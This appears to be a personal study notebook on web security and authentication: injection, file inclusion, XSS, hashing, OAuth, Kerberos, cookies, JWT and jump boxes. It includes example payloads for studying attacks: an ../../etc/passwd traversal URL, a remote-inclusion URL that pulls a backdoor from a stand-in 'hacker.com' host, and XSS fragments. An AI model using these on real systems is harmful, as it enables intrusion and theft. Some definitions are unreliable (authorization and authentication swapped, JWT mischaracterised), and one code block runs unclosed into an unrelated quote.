* _remote code execution (RCE)_: getting access to someone's server and executing arbitrary commands https://news.ycombinator.com/item?id=23308945
* e.g. log4j https://github.com/Narasimha1997/py4jshell
* _zero-day_: attacker knows before owner knows
* _DoS (denial of service)_: designed to crash system vs. extracting data https://jacobian.org/2020/sep/11/analyzing-dos-vulnerabilities/ 

---

* _zero-knowledge proof (ZKP)_: someone prove that you know something without disclosing what you know https://www.notboring.co/p/zero-knowledge
* _command injection_: input causes system call on server
* _dictionary attack_: go through list of common passwords; form of brute force
* _directory traversal_: improper validation of user input leads to read access of directory (not the file itself; that‚Äôs LFI) --> http://www.example.com?file=../../etc/passwd
* _phishing_: elicit secrets via mimicry of legimate resource e.g. set up page to mimic company internal portal https://www.wsj.com/articles/the-teenager-behind-the-twitter-hack-and-how-he-did-it-11596563449

* _packet sniffing_: if packets are sent in unencrypted fashion, can see session info
* _sensitive data_: https://github.com/hisxo/gitGraber https://github.com/trufflesecurity/trufflehog
* _tmi_: passwords in your repo, `debug!=true` in PROD https://github.com/6IX7ine/djangohunter

## file inclusion

https://security.stackexchange.com/questions/174932/what-is-the-difference-between-local-file-inclusion-lfi-and-remote-file-inclus

* _local_: directory traversal + reading file
* _remote_: including file from remote source
* _how does it typically happen?_ improper validation of user input leads to the loading of an external resource into the server and execution therein
* _example_: http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor
* `/etc/passwd`: how to read and [how to crack](https://pentestlab.blog/2012/07/23/dumping-and-cracking-unix-password-hashes/); actual passwords stored elsewhere in shadow password file [LPI 26]

* _command injection_: passing malicious code to `os.system` or similar modules
* _prevention_: input validation, parameterized queries [as in Java PreparedStatement] vs. string concat so that input cannot affect the structure of the query
* _parameterized query_: sanitization
* _how do malicious queries get in?_ GET/POST parameters, cookie values, form fields
* _what happens when they get in?_ send script to browser‚Äî> browser executes ‚Äî> logs keystrokes, takes session cookies, sends to own server

## XSS 

= 3rd-party JavaScript running on your site

* _how?_ submit form w/ malacious JS embedded in HTML attr https://flask.palletsprojects.com/en/1.1.x/security/#cross-site-scripting-xss https://24ways.org/2018/securing-your-site-like-its-1999/
* _why?_ read user cookies and send to 3rd party https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) https://security.stackexchange.com/questions/36172/is-cookie-based-xss-exploitable
* _types_: stored vs. reflected https://shoptalkshow.com/episodes/250-web-security-april-king-alex-sexton/
* _sink_: https://tonybaloney.github.io/posts/xss-exploitation-in-django.html https://terjanq.github.io/Tiny-XSS-Payloads/index.html

__in action__

üîó https://24ways.org/2018/securing-your-site-like-its-1999/

* couldn't submit `<script>`, but -> added attribute to html ala `<div style="background:url('javascript:alert(1)')">` 
> I don't understand two things about here: why URL executes (thought it only parsed file path to static resource) and why `javascript:` specifies a runtime (where else in CSS would this come up?)
* only worked on IE, but this was 2005
* couldn't invoke `document.body.innerHTML`, but -> can concatenate code and execute inside eval `eval('document.body.inne' + 'rHTML')`
* realized `innerHTML` contained links a few other user profiles
* realized he could hit MySpace API
* all recursion from there

* _OTR_: https://robertheaton.com/otr1

symmetric
* sender encrypts using shared key, recipient decrypts using shared key
* _example_: Caesar cipher
* _advantages_: faster than asymmetric (file transmisssion/storage)
* _disadvantages_: how to transmit the key, key management (need different for each node in conversation and maybe even for each session)
* _sink_: https://dev.to/isaacandsuch/this-is-how-https-works-223d

asymmetric
* sender encrypts using public key, recipient decrypts using private key; aka PKI
* uses CA as passive (contra Kerberos) trusted third-party [`oreilly-ssh.pdf` 11.5.2]
* _analogy_: public key locks safe, private key opens it https://stratechery.com/2018/open-closed-and-privacy/

## hashing

üîó https://github.com/HashPals/Name-That-Hash

* _hash_: output from hash function [Bhargava 11.214]
* _locality_: insensitive (slight diff in input changes hash completely) sensitive (slight diff in input changes hash only slightly) [Bhargava 11.216]
* _hash function_: https://austinvernon.eth.link/blog/hashexamples.html https://austinvernon.eth.link/blog/hash.html
* _rainbow table_: https://fasterthanli.me/articles/whats-in-a-rainbow-table

BYO https://www.reddit.com/r/learnprogramming/comments/33s79p/what_is_the_best_way_to_start_writing_my_own_hash/
hash function https://www.youtube.com/watch?v=cczlpiiu42M

* _hash function_: consistent i.e. input 'alice' always returns 42 [5.76] diff strings to diff nums i.e. input 'alice' returns 1 and input 'bob' returns 2 [Bhargava 5.76] https://wizardzines.com/comics/hash-functions/
```python
pass
```
* _one-way_: for identity comparison of sensitive data (does this input match a password?) salt = cannot convert hash back to input [Bhagava 11.215-218]

* _examples_: MD5 (vulnerable to collision attack, used for file integrity) SHA (use -256, not -1)
* _locality-sensitive_: for similarity comparison (are these two files similar?) magnitude of hash change reflects input string [Bhagava 11.216]
* _salt_: unique data added to one-way algo ‚ùì to differentiate it for everyone else using SHA-256 ‚ùì are one-way *really* one-way or does the addition of salt mean that it would take a ton of computing power and a million years to convert to unhash them?
* _checksum_: for identity comparison (are these two files the same?) [Bhagava 11.214] üìç do tutorial of how Michael Kennedy uses checksums for caching https://pythonbytes.fm/episodes/show/21/python-has-a-new-star-framework-for-restful-apis @ 11:30
* _salt_: has function takes password and salt (random char) and outputs hash value, which is then stored instead of the naked user/pass; prevents dictionary attack (run through list of common user/pass) bc hacker could guess user/pass and hash func but not get value bc doesn't have salt
* _collisions_: n K to same V (which will be a linked list) [Bhagava 5.87]
* _load factor_: percentage of array indices occupied; 50% is good, above 100% and you're edging away from O(1) [Bhagava 5.90]
* _resize_: increase array size [Bhagava 5.91]
* _Merkle tree_: hash of hashes

## auth

üóÑ `application.md` security

* _authorization_: identity
* _authentication_: access
* aka permissions https://github.com/authzed/spicedb https://www.thoughtworks.com/radar/languages-and-frameworks?blipid=202203085
* _RBAC_: principle of least privilege
* role-based e.g. dba has full access to all fields to db but app dev will not see any personally identifiable info e.g. in Postgres can set permissions at the column level https://softwareengineeringdaily.com/2020/07/28/access-control-management-with-fouad-matin-and-dan-gillespie/

OAuth https://www.youtube.com/watch?v=xHFzhBjnMPI
* is now Okta? https://www.okta.com/okta-and-auth0/
* allow 3rd party to use data from service (e.g. Github) w/out exposing user creds from service to 3rd party https://stackoverflow.com/a/33704657
* authorization, not authentication e.g. 3rd party uses Github for OAuth to establish an identity for a new user https://stackoverflow.com/a/33704657
* OAuth2 simpler than OAuth1, which required non-standard client (couldn't curl) and had its own security layer (vs. HTTPS) https://brandur.org/accessible-apis
* framework, not protocol üóÑ `link.md`
* sometimes known as passwordless https://dzone.com/articles/how-passwordless-authentication-works
* _token types_: access token, id token https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/
* _components_: resource owner (user) client (app that user wants to use) server/provider (authenticates user, grants token to client, which I presume is then handed to user) https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2 https://stackoverflow.com/a/10282020

* single sign-on (SSO) for corporate networks https://stackoverflow.com/a/46188971
* authentication
* login: user/pass, user/keytab (secret but not a pw)
* _keytab_: db for keys https://web.mit.edu/kerberos/krb5-1.12/doc/basic/keytab_def.html
> or secret that's not a pw
* _components_: client, service you want to talk to, ticket granting server (TGS), key distribution center (KDC)
* _realm_: collection of services a client could potentially talk to
* uses symmetric encryption [`oreilly-ssh.pdf` 11.5.2]
* uses KDC as active trusted third-party, active insofar as each message has to go through KDC, unlike PKI in which client/server can talk to each other once certificate granted [`oreilly-ssh.pdf` 11.5.2]
* kinit

## cookies

üìö `gourley-http.pdf` chapter 11

* _cookie_: val set by server
```python
from http import cookies
c = cookies.SimpleCookie()
c['foo'] = 'foo val'
c.output()
'Set-Cookie: foo="foo val"'
```

auth flow https://security.stackexchange.com/q/87269
* req: form data to auth
* res: server generates session id -> uses session id to generate cookie for 'set-cookie' header -> res w/ 302
* req: browser redirects to new URL -> sends its new cookie value along
* res: server maps cookie to session id -> auths req

## tokens

* _token_: opaque obj (string, JSON) sent to server for auth https://stackoverflow.com/a/38470665
```js
// req
Authorization: Bearer my_bearer_token_value
```

types
* _basic_: base64 encoded https://blog.luisrei.com/articles/flaskrest.html
* _bearer_: crypto signed
* used by OAuth https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#Authentication_schemes
* _JWT_: üìç http://eradman.com/posts/practical-jwt.html

approaches
* _stateless_: contains hashed version of user info (id, auth) https://en.wikipedia.org/wiki/Access_token
* _stateful_: hash used to lookup info about user server-side https://drewdevault.com/2020/06/21/BARE-message-encoding.html the token store become SPoF https://www.jbspeakr.cc/purpose-jwt-stateless-authentication/

JWT
* _JWT_: JSON obj holds claims; RFC 7519
* _claim_: key in dict https://auth0.com/docs/tokens/json-web-tokens/json-web-token-claims https://softwareengineering.stackexchange.com/a/350094/322090
* _JWS_: thing signing JWT https://stackoverflow.com/a/27642457
* _JWE_: thing encrypting JWT https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/
* req/res flow similar to cookie/session but JWT is encrypted and thus able to be stateful https://medium.com/@peterchang_82818/difference-session-cookie-token-vs-token-authentication-based-traditional-store-a177e8474ee3 https://softwareengineering.stackexchange.com/a/350094/322090

## DMZ

* _DMZ_: part of internal network w/ external-facing servers
* for connecting internal network to larger external networks e.g. WWW
* _jump box_: SSoA https://en.wikipedia.org/wiki/Jump_server https://www.youtube.com/watch?v=Mwf17O45IA0
* to non-DMZ e.g. db
* to DMZ e.g. web servers
* e.g. n admins for AWS servers, all admins go through jumpbox instead of each admin using own machine
* easier to harden single jump box than n machines
* servers only allow jump box IP address range [2:30]
* aka bastion host
* workflow: ssh to jump box, port forward from jump box to server
```sh
# local to jump box, jump box port forward to destination
ssh -l localport:host:port jumpbox
# e.g. port forward local 9998 to destination 27 via jump box
ssh -L 9998:db.foo.io:27017 jumpbox.foo.io
mongo mongodb://user:pw@addr:port/db

> In parallel, Apple has built up its own ad system on the iPhone, which records, tracks and targets users and serves them ads, but does this on the device itself rather than on the cloud, and only its own apps and services. Apple tracks lots of different aspects of your behaviour and uses that data to put you into anonymised interest-based cohorts and serve you ads that are targeted to your interests, in the App Store, Stocks and News apps. You can read Apple‚Äôs description of that here - Apple is tracking a lot of user data, but nothing leaves your phone. Your phone is tracking you, but it doesn‚Äôt tell anyone anything. This is conceptually pretty similar to Google‚Äôs proposed FLoC, in which your Chrome web browser uses the web pages you visit to put you into anonymised interest-based cohorts without your browsing history itself leaving your device. Publishers (and hence advertisers) can ask Chrome for a cohort and serve you an appropriate ad rather than tracking and targeting you yourself. Your browser is tracking you, but it doesn‚Äôt tell anyone anything -except for that anonymous cohort. https://www.ben-evans.com/benedictevans/2021/5/13/apples-ads-music

my current approach
* Makefile rule to sym link canonical env file into place from either `.env.dev` or `env.prod` [Osborn 14.106] export secrets from shell and document in README https://12factor.net/config downside is duplication btw files, this config class inheritance would pay off
```makefile
env-list:
	ls -al | grep '>'

env-dev:
	ln -sf .env.dev .env

env-prod:
	ln -sf .env.prod .env
```
* dummy approach to toggling database (in order to maintain test suite db setup)
* this emerged bc adding Postgres connection broke db setup for integration tests
* what you should probably do is overwrite the db connection in the test module itself
```python
if os.getenv("FLASK_ENV") == "production":
    db_uri = "postgresql://postgres:postgres@db:5432/postgres"
else
    db_path = os.path.join(basedir, os.getenv("DATABASE"))
    db_uri = "sqlite:///" + db_path
```
